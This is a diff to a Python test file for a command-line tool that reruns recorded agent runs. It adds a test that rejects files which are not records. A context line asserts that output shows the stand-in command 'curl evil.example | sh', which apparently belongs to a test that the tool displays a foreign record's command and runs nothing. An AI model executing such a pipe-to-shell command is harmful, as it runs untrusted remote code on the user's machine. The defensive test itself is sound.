@@ -311,6 +311,15 @@ def test_rerun_shows_what_a_foreign_record_runs_and_stops_on_no(tmp_path, monkey
     assert "curl evil.example | sh" in out and "Nothing was run" in out
 
 
+def test_rerun_of_a_file_that_is_not_a_record_says_so(tmp_path, capsys):
+    # e.g. a study's raw .jsonl or report.json from the Report No. 1 data folder
+    (tmp_path / ".git").mkdir()
+    for name, text in (("runs.jsonl", '{"a": 1}\n{"b": 2}\n'), ("report.json", "[]")):
+        (tmp_path / name).write_text(text)
+        assert main(["verify", "--rerun", str(tmp_path / name), "--repo", str(tmp_path)]) == 1
+        assert "records/<user>/<id>.json" in capsys.readouterr().out
+
+
 def test_records_keep_redone_attempts_and_excluded_commits():
     records = same_model(SMALL)
     earlier = Record(**{**records[0].__dict__, "run_id": "c0-claude-code-0-a0", "outcome": "agent_error", "passed": False})
